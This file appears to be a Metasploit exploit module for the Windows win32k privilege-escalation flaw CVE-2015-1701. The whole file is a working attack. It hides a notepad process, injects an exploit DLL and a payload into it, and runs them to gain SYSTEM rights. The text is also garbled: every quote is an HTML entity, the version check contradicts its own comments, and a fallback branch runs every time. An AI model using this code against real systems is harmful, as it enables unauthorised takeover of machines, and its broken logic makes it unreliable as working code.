# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/post/windows/reflective_dll_injection&#039;
require &#039;rex&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;            => &#039;Windows ClientCopyImage Win32k Exploit&#039;,
      &#039;Description&#039;     => %q{
        This module exploits improper object handling in the win32k.sys kernel mode driver.
        This module has been tested on vulnerable builds of Windows 7 x64 and x86, and
        Windows 2008 R2 SP1 x64.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          => [
          &#039;Unknown&#039;,    # vulnerability discovery and exploit in the wild
          &#039;hfirefox&#039;,   # Code released on github
          &#039;OJ Reeves&#039;   # msf module
        ],
      &#039;Arch&#039;            => [ ARCH_X86, ARCH_X86_64 ],
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;DefaultOptions&#039;  => {
          &#039;EXITFUNC&#039;    => &#039;thread&#039;,
        },
      &#039;Targets&#039;         => [
          [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
        ],
      &#039;Payload&#039;         => {
          &#039;Space&#039;       => 4096,
          &#039;DisableNops&#039; => true
        },
      &#039;References&#039;      => [
          [&#039;CVE&#039;, &#039;2015-1701&#039;],
          [&#039;MSB&#039;, &#039;MS15-051&#039;],
          [&#039;URL&#039;, &#039;https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html&#039;],
          [&#039;URL&#039;, &#039;https://github.com/hfiref0x/CVE-2015-1701&#039;],
          [&#039;URL&#039;, &#039;https://technet.microsoft.com/library/security/MS15-051&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;May 12 2015&#039;,
      &#039;DefaultTarget&#039;   => 0
    }))
  end

  def check
    # Windows Server 2008 Enterprise SP2 (32-bit)  6.0.6002.18005 (Does not work)
    # Winodws 7 SP1 (64-bit)                       6.1.7601.17514 (Works)
    # Windows 7 SP1 (32-bit)                       6.1.7601.17514 (Works)
    # Windows Server 2008 R2 (64-bit) SP1          6.1.7601.17514 (Works)

    if sysinfo[&#039;OS&#039;] !~ /windows/i
      return Exploit::CheckCode::Unknown
    end

    if sysinfo[&#039;Architecture&#039;] =~ /(wow|x)64/i
      arch = ARCH_X86_64
    elsif sysinfo[&#039;Architecture&#039;] =~ /x86/i
      arch = ARCH_X86
    end

    file_path = expand_path(&#039;%windir%&#039;) << &#039;\\system32\\win32k.sys&#039;
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")

    return Exploit::CheckCode::Safe if build == 7601

    return Exploit::CheckCode::Detected
  end

  def exploit
    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end

    if check == Exploit::CheckCode::Safe || check == Exploit::CheckCode::Unknown
      fail_with(Failure::NotVulnerable, &#039;Exploit not available on this system.&#039;)
    end

    if sysinfo[&#039;Architecture&#039;] =~ /wow64/i
      fail_with(Failure::NoTarget, &#039;Running against WOW64 is not supported&#039;)
    elsif sysinfo[&#039;Architecture&#039;] =~ /x64/ && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, &#039;Session host is x64, but the target is specified as x86&#039;)
    elsif sysinfo[&#039;Architecture&#039;] =~ /x86/ && target.arch.first == ARCH_X86_64
      fail_with(Failure::NoTarget, &#039;Session host is x86, but the target is specified as x64&#039;)
    end

    print_status(&#039;Launching notepad to host the exploit...&#039;)
    notepad_process = client.sys.process.execute(&#039;notepad.exe&#039;, nil, {&#039;Hidden&#039; => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      # Reader Sandbox won&#039;t allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status(&#039;Operation failed. Trying to elevate the current process...&#039;)
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    if target.arch.first == ARCH_X86
      dll_file_name = &#039;cve-2015-1701.x86.dll&#039;
    else
      dll_file_name = &#039;cve-2015-1701.x64.dll&#039;
    end

    library_path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-1701&#039;, dll_file_name)
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status(&#039;Payload injected. Executing exploit...&#039;)
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good(&#039;Exploit finished, wait for (hopefully privileged) payload execution to complete.&#039;)
  end

end

